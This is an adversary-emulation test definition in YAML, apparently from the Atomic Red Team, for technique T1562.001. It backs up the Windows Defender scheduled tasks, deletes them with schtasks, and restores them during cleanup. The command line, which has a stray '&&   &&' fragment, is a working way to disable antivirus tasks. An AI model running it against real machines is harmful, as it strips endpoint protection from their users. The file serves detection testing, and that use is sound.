- description: 'The following atomic test will delete the Windows Defender scheduled
    tasks.


    [Reference](https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/)

    '
  id: c29edb8d-e023-2248-355c-1911983620b1
  name: Delete Windows Defender Scheduled Tasks
  platforms:
    windows:
      cmd:
        cleanup: schtasks /create /xml "%temp%\Windows_Defender_Scheduled_Scan.xml"
          /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan"
          /f && schtasks /create /xml "%temp%\Windows_Defender_Cleanup.xml" /tn "\Microsoft\Windows\Windows
          Defender\Windows Defender Cleanup" /f && schtasks /create /xml "%temp%\Windows_Defender_Verification.xml"
          /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification"
          /f && schtasks /create /xml "%temp%\Windows_Defender_Cache_Maintenance.xml"
          /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance"
          /f
        command: IF EXIST "%temp%\Windows_Defender_Scheduled_Scan.xml"  ( call ) ELSE
          ( schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows
          Defender Scheduled Scan" > "%temp%\Windows_Defender_Scheduled_Scan.xml"
          && schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows
          Defender Cleanup" > "%temp%\Windows_Defender_Cleanup.xml" && schtasks /query
          /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification"
          > "%temp%\Windows_Defender_Verification.xml" && schtasks /query /xml /tn
          "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance"
          > "%temp%\Windows_Defender_Cache_Maintenance.xml" ) &&   &&  IF EXIST "%temp%\Windows_Defender_Scheduled_Scan.xml"
          ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender
          Scheduled Scan" /f ) && IF EXIST "%temp%\Windows_Defender_Cleanup.xml" (
          schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender
          Cleanup" /f ) && IF EXIST "%temp%\Windows_Defender_Verification.xml" ( schtasks
          /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification"
          /f ) && IF EXIST "%temp%\Windows_Defender_Cache_Maintenance.xml" ( schtasks
          /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache
          Maintenance" /f )
        payloads: []
  tactic: defense-evasion
  technique:
    attack_id: T1562.001
    name: 'Impair Defenses: Disable or Modify Tools'
